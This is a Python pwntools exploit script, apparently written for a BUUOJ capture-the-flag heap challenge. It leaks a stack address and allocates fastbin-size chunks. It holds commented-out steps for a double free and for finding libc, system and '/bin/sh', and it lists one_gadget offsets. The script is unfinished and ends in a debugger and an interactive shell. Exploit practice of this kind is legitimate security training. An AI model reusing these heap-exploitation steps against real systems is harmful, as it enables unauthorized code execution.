import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='pwn'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',25549)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			libc=pdbg.libc
			#io=pdbg.run("debug")
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('3. Exit','1')
			io.sendlineafter('Enter the index you want to create(0-9):',str(a))
			io.sendlineafter('How long you will enter:',str(b))
			io.sendafter('please enter the content:',c)

		def delete(a):
			io.sendlineafter('3. Exit','2')
			io.sendlineafter('Enter your index (0-9):',str(a))



		

		io.recv()
		io.sendline('3')
		io.sendline(str(0x71))
		io.recvuntil('0x')
		stack_addr=int(io.recvline(),16)-8
		add(0,0x68,'aaaa')
		add(1,0x68,'aaaa')
		# delete(0)
		# delete(1)
		# delete(0)
		# add(2,0x68,p64(stack_addr)[:6])
		# add(3,0x68,p64(stack_addr)[:6])
		# add(4,0x68,p64(stack_addr)[:6])
		# add(5,0x68,p64(stack_addr))


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue